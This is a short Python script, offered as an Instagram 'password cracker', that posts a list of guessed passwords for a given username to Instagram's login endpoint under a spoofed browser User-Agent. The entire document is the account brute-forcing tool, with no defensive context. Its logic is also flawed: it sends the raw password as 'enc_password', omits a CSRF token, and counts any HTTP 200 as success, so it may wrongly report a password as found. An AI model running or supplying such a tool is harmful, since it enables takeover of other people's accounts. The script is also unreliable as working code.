import requests

def instagram_cracker(username, passwords):
    login_url = "https://www.instagram.com/accounts/login/ajax/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }

    for password in passwords:
        data = {
            "username": username,
            "enc_password": password,
            "queryParams": {},
            "optIntoOneTap": "false"
        }
        response = requests.post(login_url, headers=headers, data=data)
        if response.status_code == 200:
            print(f"Password found: {password}")
            break
        else:
            print(f"Tried password: {password} - Failed")

if __name__ == "__main__":
    username = input("Enter the Instagram username: ")
    passwords = input("Enter the list of passwords to try (comma-separated): ").split(",")
    print(f"Starting password cracker for {username}")
    instagram_cracker(username, passwords)